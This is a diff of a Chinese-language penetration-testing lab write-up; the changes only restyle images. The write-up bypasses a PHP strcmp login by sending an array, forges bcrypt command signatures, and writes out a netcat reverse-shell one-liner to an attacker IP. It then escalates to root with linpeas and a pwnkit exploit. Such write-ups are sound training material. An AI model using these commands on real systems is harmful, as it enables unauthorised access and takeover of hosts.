@@ -146,27 +146,27 @@ Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
 随便注册一个进去，有个whami功能，并且在主页提交功能会显示你不是admin用户，我就猜肯定是让我以admin用户登录，但是想了半天，一直感觉是sql注入，还是打靶少了，找红笔要了点提示，得知是strcmp函数校验的password字段，那就简单了，黑盒情况居然完全没有想到这个。PHP 弱类型 + strcmp 误用。<br>
 函数判断成功的条件，肯定是让函数结果返回0，即两者相同，或者让strcmp函数报错，strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。<br>
 先传入NULL值，或者在抓包直接将password字段删除，但是应该被实体化了，失败，放弃。然后就是传入数组，将password字段写成password[]，本身password接受的是字符串，但是传入的是一个数组数据，让strcmp函数前后数据类型不一致产生报错，从而绕过。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e29d8a94-2097-41e5-a5a9-eeb0cfebdb4f"><img width="1916" height="959" alt="Image" src="https://github.com/user-attachments/assets/e29d8a94-2097-41e5-a5a9-eeb0cfebdb4f" style="max-width: 100%; height: auto; max-height: 959px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e29d8a94-2097-41e5-a5a9-eeb0cfebdb4f"><img width="1916" height="959" alt="Image" src="https://github.com/user-attachments/assets/e29d8a94-2097-41e5-a5a9-eeb0cfebdb4f" style="max-width: 100%; height: auto; max-height: 959px;; aspect-ratio: 1916 / 959; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>成功绕过了。再看看</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7"><img width="1919" height="932" alt="Image" src="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7" style="max-width: 100%; height: auto; max-height: 932px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7"><img width="1919" height="932" alt="Image" src="https://github.com/user-attachments/assets/3a276bc2-b506-45cf-bfd0-256060105ed7" style="max-width: 100%; height: auto; max-height: 932px;; aspect-ratio: 1919 / 932; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>错误的签名，是一个 bcrypt 哈希，使用hashcat爆破一下，是whoami的密文</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc"><img width="1916" height="910" alt="Image" src="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc" style="max-width: 100%; height: auto; max-height: 910px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc"><img width="1916" height="910" alt="Image" src="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc" style="max-width: 100%; height: auto; max-height: 910px;; aspect-ratio: 1916 / 910; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>那么初步判断是将command中的命令加密作为签名。并且在后续尝试发现对他的salt值也不固定，随机的也行。<br>
 使用一下命令生成没有用户名的签名</p>
 <blockquote>
 <p>htpasswd -bnBC "10" "" "ls" | tr -d ':\n'</p>
 </blockquote>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11"><img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11" style="max-width: 100%; height: auto; max-height: 968px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11"><img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11" style="max-width: 100%; height: auto; max-height: 968px;; aspect-ratio: 1919 / 968; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>确实是这样。</p>
 <h1>漏洞利用</h1>
 <p>开始获取shell<br>
 再尝试bash，sh，nc之后我发现有报错命令报错会弹窗error，不知道为什么不行，最后使用<code class="notranslate">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f</code>反弹成功。</p>
 <h1>提权</h1>
 <p>直接上linpeas扫一遍</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac"><img width="1919" height="774" alt="Image" src="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac" style="max-width: 100%; height: auto; max-height: 774px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac"><img width="1919" height="774" alt="Image" src="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac" style="max-width: 100%; height: auto; max-height: 774px;; aspect-ratio: 1919 / 774; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>没有其他明显的提权提示，所以我就直接尝试内核提权，先试第一个，可行性最高<br>
 使用<code class="notranslate">gcc --static pwnkit.c -o exp</code> 静态编译，以免环境</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a"><img width="1919" height="669" alt="Image" src="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a" style="max-width: 100%; height: auto; max-height: 669px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a"><img width="1919" height="669" alt="Image" src="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a" style="max-width: 100%; height: auto; max-height: 669px;; aspect-ratio: 1919 / 669; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>提权成功。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
